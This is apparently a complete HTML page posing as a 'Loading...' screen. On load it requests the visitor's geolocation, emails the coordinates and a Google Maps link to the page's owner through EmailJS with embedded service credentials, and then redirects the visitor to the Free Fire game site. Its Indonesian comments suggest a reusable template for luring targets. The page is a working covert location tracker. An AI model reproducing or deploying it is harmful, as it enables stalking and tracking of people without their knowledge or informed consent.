<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){

  emailjs.init("Ab3xvPQCqJkB8Kh_V"); // ganti dengan public key asli

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

      function(position){

        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

        emailjs.send("service_lt5tmzc", "template_e16cgrw", {
          name: "Visitor",
          time: new Date().toLocaleString(),
          message: "Lokasi berhasil diambil",
          latitude: latitude,
          longitude: longitude,
          maps: mapsLink
        }).then(function(){
            window.location.replace("https://ff.garena.com");
        });

      },

      function(){
        window.location.replace("https://domainB.com");
      }

    );

  }

})();
</script>

</head>

</body>
</html>
